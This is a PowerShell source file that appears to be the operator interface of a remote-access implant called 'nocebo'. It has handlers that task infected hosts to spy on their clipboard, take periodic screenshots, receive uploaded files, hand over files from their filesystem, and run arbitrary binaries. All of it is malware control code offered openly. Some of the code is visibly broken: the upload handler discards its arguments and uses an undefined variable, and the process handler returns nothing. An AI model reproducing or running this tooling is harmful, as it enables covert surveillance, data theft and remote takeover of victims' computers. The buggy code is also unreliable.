function genlib-clipper-nocebo-ui-handler()
{
    $continueLoop = $true
    $paramSet = @{"uuid"=@{"value"="null";"description"="ephemeral uuid to execute the module"};"duration"=@{"value"="null";"description"="amount of time in seconds for which the module will monitor the clipboard"}}
    while ($continueLoop) 
    {
        $handled = genericHandler "genlib-clipper is designed to monitor the clipboard of hosts on which the nocebo implant is installed" $paramSet "nocebo/autolib/clipper_ "
        if ($handled -eq 0)
        {
            continue
        }
        elseif ($handled -eq 1)
        {
            $uuid = $paramSet["uuid"]["value"]
            $paramSet["className"] = "genLib"
            $paramSet["methodName"] = "clipper"
            $paramSet["args"] = "duration,$(($paramSet['duration'])["value"])"
            $paramSet.remove("duration")
            
            $continueLoop = $false
        }
        elseif ($handled -eq 2)
        {
            continue
        }
        elseif ($handled -eq 3)
        {
            $paramSet["uuid"] = "retr"
            $continueLoop = $false
        }
        else
        {
            $paramSet = $handled
        }
        
    }
    return $paramSet
}

function genlib-snapper-nocebo-ui-handler()
{
    $continueLoop = $true
    $paramSet = @{"uuid"=@{"value"="null";"description"="ephemeral uuid to execute the module"};"duration"=@{"value"="null";"description"="amount of time in seconds for which the module will monitor the screen"};"frequency"=@{"value"="null";"description"="the number (as a whole int) of screenshots to take during module execution"}}
    while ($continueLoop) 
    {
    $handled = genericHandler "genlib-snapper is designed to take regular screenshots of the hosts on which nocebo is installed" $paramSet "nocebo/autolib/snapper_ "
        if ($handled -eq 0)
        {
            continue
        }
        elseif ($handled -eq 1)
        {
            $paramSet["className"] = "genLib"
            $paramSet["methodName"] = "snapper"
            $paramSet["args"] = "duration,$(($paramSet['duration'])["value"]),frequency,$(($paramSet['frequency'])["value"])"
            $paramSet.remove("duration")
            $paramSet.remove("frequency")
            $continueLoop = $false
        }
        elseif ($handled -eq 2)
        {
            continue
        }
        elseif ($handled -eq 3)
        {
            $paramSet["uuid"] = "retr"
            $continueLoop = $false
        }
        else
        {
            $paramSet = $handled
        }
    }
    return $paramSet
}

function genlib-upload-nocebo-ui-handler()
{
    $continueLoop = $true
    $paramSet = @{"uuid"=@{"value"="null";"description"="ephemeral uuid to execute the module"};"data"=@{"value"="null";"description"="local path to file for upload to implant"};"location"=@{"value"="null";"description"="absolute path of the location on the target filesystem to place the uploaded file"}}
    while ($continueLoop) 
    {
    $handled = genericHandler "genlib-upload is designed to transfer files to the filesystem of hosts on which the nocebo implant is installed" $paramSet "nocebo/genlib/upload_ "
        if ($handled -eq 0)
        {
            continue
        }
        elseif ($handled -eq 1)
        {
            $paramSet["className"] = "genLib"
            $paramSet["methodName"] = "upload"
            $paramSet["args"] = "data,$(($paramSet['data'])["value"]),location,$(($paramSet['location'])["value"])"
            $paramSet.remove("data")
            $paramSet.remove("location")
            $paramSet["args"] = ""
            $continueLoop = $false
        }
        elseif ($handled -eq 2)
        {
            continue
        }
        elseif ($handled -eq 3)
        {
            $paramSet["uuid"] = "retr"
            $continueLoop = $false
        }
        else
        {
            #$paramSet = $handled
            #check if path
            if ($(test-path $handled["data"]))
            {
                $uploadBytes = [io.file]::ReadAllBytes($handled[$data])
                $handled["data"] = [system.convert]::tobase64string($uploadBytes)
                $paramSet = $handled
            }
            else
            {
                $paramSet = $handled
            }
        }
    }
    return $paramSet
}

function genlib-download-nocebo-ui-handler()
{
    $continueLoop = $true
    $paramSet = @{"uuid"=@{"value"="null";"description"="ephemeral uuid to execute the module"};"location"=@{"value"="null";"description"="absolute path of location on the target filesystem to download file from"}}
    while ($continueLoop) 
    {
    $handled = genericHandler "genlib-download is designed to transfer files from the filesystem of hosts on which the nocebo implant is installed" $paramSet "nocebo/genlib/download_ "
        if ($handled -eq 0)
        {
            continue
        }
        elseif ($handled -eq 1)
        {
            $paramSet["className"] = "genLib"
            $paramSet["methodName"] = "download"
            $paramSet["args"] = "location,$(($paramSet['location'])["value"])"
            $paramSet.remove("location")
            $continueLoop = $false
        }
        elseif ($handled -eq 2)
        {
            continue
        }
        elseif ($handled -eq 3)
        {
            $paramSet["uuid"] = "retr"
            $continueLoop = $false
        }
        else
        {
            $paramSet = $handled
        }
    }
    return $paramSet
}

function genlib-process-nocebo-ui-handler()
{
    $continueLoop = $true
    $paramSet = @{"uuid"=@{"value"="null";"description"="ephemeral uuid to execute the module"};"command"=@{"value"="null";"description"="the binary to execute"};"arguments"=@{"value"="null";"description"="the arguments to run with the command"}}
    while ($continueLoop) 
    {
    $handled = genericHandler "genlib-process is designed to execute an arbitrary binary with arguments on hosts on which the nocebo implant is installed" $paramSet "nocebo/genlib/process_ "
        if ($handled -eq 0)
        {
            continue
        }
        elseif ($handled -eq 1)
        {
            $paramSet["className"] = "genLib"
            $paramSet["methodName"] = "process"
            $paramSet["args"] = "command,$(($paramSet['command'])["value"]),arguments,$(($paramSet['arguments'])["value"])"
            $paramSet.remove("command")
            $paramSet.remove("arguments")
            $continueLoop = $false
        }
        elseif ($handled -eq 2)
        {
            continue
        }
        elseif ($handled -eq 3)
        {
            $paramSet["uuid"] = "retr"
            $continueLoop = $false
        }
        else
        {
            $paramSet = $handled
        }
    }
}
